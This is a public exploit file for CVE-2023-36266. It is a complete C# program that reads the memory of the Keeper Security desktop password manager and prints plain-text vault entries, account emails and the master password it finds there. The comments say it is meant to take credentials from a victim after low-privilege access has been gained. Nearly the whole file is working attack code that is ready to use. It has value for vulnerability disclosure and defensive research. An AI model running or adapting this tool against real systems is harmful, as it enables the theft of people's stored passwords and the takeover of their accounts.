# Exploit Title: Keeper Security desktop 16.10.2 & Browser Extension 16.5.4 - Password Dumping
# Google Dork: NA
# Date: 22-07-2023
# Exploit Author: H4rk3nz0
# Vendor Homepage: https://www.keepersecurity.com/en_GB/
# Software Link: https://www.keepersecurity.com/en_GB/get-keeper.html
# Version: Desktop App version 16.10.2 & Browser Extension version 16.5.4
# Tested on: Windows
# CVE : CVE-2023-36266

using System;
using System.Management;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;

// Keeper Security Password vault Desktop application and Browser Extension stores credentials in plain text in memory
// This can persist after logout if the user has not explicitly enabled the option to 'clear process memory'
// As a result of this one can extract credentials & master password from a victim after achieving low priv access
// This does NOT target or extract credentials from the affected browser extension (yet), only the Windows desktop app.
// Github: https://github.com/H4rk3nz0/Peeper

static class Program
{
    // To make sure we are targetting the right child process - check command line
    public static string GetCommandLine(this Process process)
    {
        if (process is null || process.Id < 1)
        {
            return "";
        }
        string query = $@"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}";
        using (var searcher = new ManagementObjectSearcher(query))
        using (var collection = searcher.Get())
        {
            var managementObject = collection.OfType<ManagementObject>().FirstOrDefault();
            return managementObject != null ? (string)managementObject["CommandLine"] : "";
        }
    }

    //Extract plain text credential JSON strings (regex inelegant but fast)
    public static void extract_credentials(string text)
    {
        int index = text.IndexOf("{\"title\":\"");
        int eindex = text.IndexOf("}");
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(\\{\\\"title\\\"[ -~]+\\}(?=\\s))");
                string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();

                int match_cut = match.IndexOf("}  ");
                if (match_cut != -1 )
                {
                    match = match.Substring(0, match_cut + "}  ".Length).TrimEnd();
                    if (!stringsList.Contains(match) && match.Length > 20)
                    {
                        Console.WriteLine("->Credential Record Found : " + match.Substring(0, match_cut + "}  ".Length) + "\n");
                        stringsList.Add(match);
                    }

                } else if (!stringsList.Contains(match.TrimEnd()) && match.Length > 20)
                {
                    Console.WriteLine("->Credential Record Found : " + match + "\n");
                    stringsList.Add(match.TrimEnd());
                }
                index = text.IndexOf("{\"title\":\"", index + 1);
                eindex = text.IndexOf("}", eindex + 1);
            }
            catch
            {
                return;
            }

        }
    }

    // extract account/email containing JSON string
    public static void extract_account(string text)
    {
        int index = text.IndexOf("{\"expiry\"");
        int eindex = text.IndexOf("}");
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(\\{\\\"expiry\\\"[ -~]+@[ -~]+(?=\\}).)");
                string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
                if ((match.Length > 2))
                {
                    Console.WriteLine("->Account Record Found : " + match + "\n");
                    return;
                }
                index = text.IndexOf("{\"expiry\"", index + 1);
                eindex = text.IndexOf("}", eindex + 1);
            }
            catch
            {
                return;
            }
        }

    }

    // Master password not available with SSO based logins but worth looking for.
    // Disregard other data key entries that seem to match: _not_master_key_example
    public static void extract_master(string text)
    {
        int index = text.IndexOf("data_key");
        int eindex = index + 64;
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(data_key[ -~]+)");
                var match_one = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
                Regex clean = new Regex("(_[a-zA-z]{1,14}_[a-zA-Z]{1,10})");
                if (match_one.Replace("data_key", "").Length > 5)
                {
                    if (!clean.IsMatch(match_one.Replace("data_key", "")))
                    {
                        Console.WriteLine("->Master Password : " + match_one.Replace("data_key", "") + "\n");
                    }

                }
                index = text.IndexOf("data_key", index + 1);
                eindex = index + 64;
            }
            catch
            {
                return;
            }

        }
    }

    // Store extracted strings and comapre 
    public static List<string> stringsList = new List<string>();

    // Main function, iterates over private committed memory pages, reads memory and performs regex against the pages UTF-8
    // Performs OpenProcess to get handle with necessary query permissions
    static void Main(string[] args)
    {
        foreach (var process in Process.GetProcessesByName("keeperpasswordmanager"))
        {
            string commandline = GetCommandLine(process);
            if (commandline.Contains("--renderer-client-id=5") || commandline.Contains("--renderer-client-id=7"))
            {
                Console.WriteLine("->Keeper Target PID Found: {0}", process.Id.ToString());
                Console.WriteLine("->Searching...\n");
                IntPtr processHandle = OpenProcess(0x00000400 | 0x00000010, false, process.Id);
                IntPtr address = new IntPtr(0x10000000000);
                MEMORY_BASIC_INFORMATION memInfo = new MEMORY_BASIC_INFORMATION();
                while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(memInfo)) != 0)
                {
                    if (memInfo.State == 0x00001000 && memInfo.Type == 0x20000)
                    {
                        byte[] buffer = new byte[(int)memInfo.RegionSize];
                        if (NtReadVirtualMemory(processHandle, memInfo.BaseAddress, buffer, (uint)memInfo.RegionSize, IntPtr.Zero) == 0x0)
                        {
                            string text = Encoding.ASCII.GetString(buffer);
                            extract_credentials(text);
                            extract_master(text);
                            extract_account(text);
                        }
                    }

                    address = new IntPtr(memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64());
                }

                CloseHandle(processHandle);

            }

        }

    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    public static extern uint NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, IntPtr NumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }
}